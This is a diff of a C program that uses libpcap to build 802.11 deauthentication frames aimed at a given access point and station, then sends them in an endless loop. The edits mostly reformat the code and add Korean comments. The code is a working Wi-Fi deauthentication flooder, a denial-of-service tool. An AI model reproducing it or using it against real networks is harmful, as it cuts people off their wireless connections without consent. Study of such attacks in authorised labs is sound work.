@@ -3,12 +3,13 @@
 #include <stdio.h>
 #include <string.h>
 
-struct Radio{
-    uint8_t   version;     /* set to 0 */
-    uint8_t   pad;
-    uint16_t  len;         /* entire length */
-    uint32_t  present;     /* fields present */
-}; //size of 12
+struct Radio
+{
+    uint8_t version; /* set to 0 */
+    uint8_t pad;
+    uint16_t len;     /* entire length */
+    uint32_t present; /* fields present */
+};                    // size of 8
 
 struct DeauthHd
 {
@@ -82,19 +83,21 @@ int main(int argc, char *argv[])
     packet.Dth.FcF = 0x00C0; // 0xC000
     packet.Dth.Dur = 0x0;
 
-    // ff:ff:ff:ff:ff:ff
     Mac_(AP_MAC, packet.Dth.APMac);
     Mac_(STA_MAC, packet.Dth.STAMac);
     Mac_(AP_MAC, packet.Dth.BSSID);
+
     packet.Dth.FSnumber = 0x0;
     packet.Dtb.Rcode = 0x0007;
-    printf("size : %ld\n",sizeof(packet));
-    while(1){
-    if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet)-2) != 0)
+    
+    //패킷 전송
+    while (1)
     {
-        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
-        return -1;
-    }
+        if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet) - 2) != 0)
+        {
+            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
+            return -1;
+        }
     }
     pcap_close(pcap);
 }
@@ -108,12 +111,10 @@ void Mac_(const char *arr, u_char mac_addr[6])
     }
     char cpyarr[18];
     memcpy(cpyarr, arr, 17);
-    for (int i = 0; i < 6; i++)
+    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
     {
         cpyarr[i * 3 + 2] = '\0';
         sscanf((const char *)&cpyarr[3 * i], "%x", &a);
-        //printf("%x", a);
         mac_addr[i] = (u_char)a;
     }
-    //printf("\n");
 }
